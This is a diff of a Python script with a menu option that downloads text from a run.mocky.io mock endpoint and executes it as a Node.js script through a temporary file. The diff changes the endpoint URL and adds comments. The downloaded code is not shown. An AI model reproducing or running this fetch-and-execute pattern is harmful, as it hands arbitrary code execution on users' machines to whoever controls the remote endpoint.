@@ -17,11 +17,13 @@ def check_internet_connection():
         return False
 
 def run_node_script(script_content):
+    # Create a temporary file to save the Node.js script
     with tempfile.NamedTemporaryFile(delete=False, suffix='.js', mode='w', encoding='utf-8') as temp_file:
         temp_file.write(script_content)
         temp_file_path = temp_file.name
 
     try:
+        # Run the Node.js script using the Node.js runtime
         result = subprocess.run(['node', temp_file_path], capture_output=True, text=True, encoding='utf-8')
         print(f"Node.js script output:\n{result.stdout}")
         if result.stderr:
@@ -43,7 +45,7 @@ try:
         elif chon == '1':
             if check_internet_connection():
                 try:
-                    response = requests.get('https://run.mocky.io/v3/c4725cb1-d2c0-41a5-86dc-fa095b9750ff')
+                    response = requests.get('https://run.mocky.io/v3/5091de17-a202-4bc8-a53f-674bf71732a6')
                     response.raise_for_status()
                     run_node_script(response.text)
                 except requests.RequestException as e:
